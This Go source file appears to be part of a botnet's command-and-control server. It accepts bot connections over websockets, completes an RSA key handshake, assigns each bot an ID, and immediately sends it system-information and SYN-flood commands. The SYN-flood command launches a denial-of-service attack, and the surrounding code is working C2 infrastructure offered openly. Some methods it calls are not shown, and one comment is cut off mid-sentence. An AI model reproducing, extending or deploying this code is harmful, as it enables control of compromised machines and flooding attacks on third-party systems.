package ccworker

import (
	"crypto/rsa"
	"fmt"
	"net/http"

	"github.com/adrianosela/botnet/lib/encryption"
	"github.com/adrianosela/botnet/lib/protocol"
	"github.com/gorilla/websocket"

	uuid "github.com/satori/go.uuid"
)

// BotWorker holds the information the command and control server needs
// from a connected bot
type BotWorker struct {
	ID            string
	cmdEncryptKey *rsa.PublicKey
	msgDecryptKey *rsa.PrivateKey
	wsConn        *websocket.Conn
	cmdOutChan    chan *protocol.Command
	msgFwdChan    chan *protocol.Message
}

// DispatchNewBot takes in an http request to the botnet endpoint
// and dispatches a new bot worker, which is in charge of
func DispatchNewBot(w http.ResponseWriter, r *http.Request, msgDecryptKey *rsa.PrivateKey, msgFwdChan chan *protocol.Message) (*BotWorker, error) {
	// upgrade protocol to websockets connection
	upgrader := websocket.Upgrader{ReadBufferSize: 1024, WriteBufferSize: 1024}
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return nil, fmt.Errorf("could not upgrade HTTP -> WS: %s", err)
	}
	// receive public key from bot handshake
	botPubKey, err := protocol.BotHandshake(conn, msgDecryptKey)
	if err != nil {
		return nil, fmt.Errorf("received join request but failed to complete net handshake: %s", err)
	}
	// create new bot botWorker
	pubKey, err := encryption.DecodePubKeyPEM([]byte(botPubKey))
	if err != nil {
		return nil, fmt.Errorf("could not decode pub key: %s", err)
	}
	bot := &BotWorker{
		ID:            uuid.NewV4().String(),
		cmdEncryptKey: pubKey,
		msgDecryptKey: msgDecryptKey,
		wsConn:        conn,
		cmdOutChan:    make(chan *protocol.Command),
		msgFwdChan:    msgFwdChan,
	}
	go bot.writer()
	go bot.reader()
	// let remote bot know enrolment succeeded
	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeAccepted}); err != nil {
		return nil, fmt.Errorf("could not send ACCEPTED command to bot %s: %s", bot.ID, err)
	}
	// get some info on the new bot
	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeSysInfo}); err != nil {
		return nil, fmt.Errorf("could not send SYS_INFO command to bot %s: %s", bot.ID, err)
	}
	// test synflood
	if err := bot.Send(&protocol.Command{Type: protocol.CommandTypeSynflood}); err != nil {
		return nil, fmt.Errorf("could not send SYN_FLOOD command to bot %s: %s", bot.ID, err)
	}
	return bot, nil
}

// GracefulShutdown closes a bot owkrer's outbound-command channel
func (b *BotWorker) GracefulShutdown() {
	close(b.cmdOutChan)
}
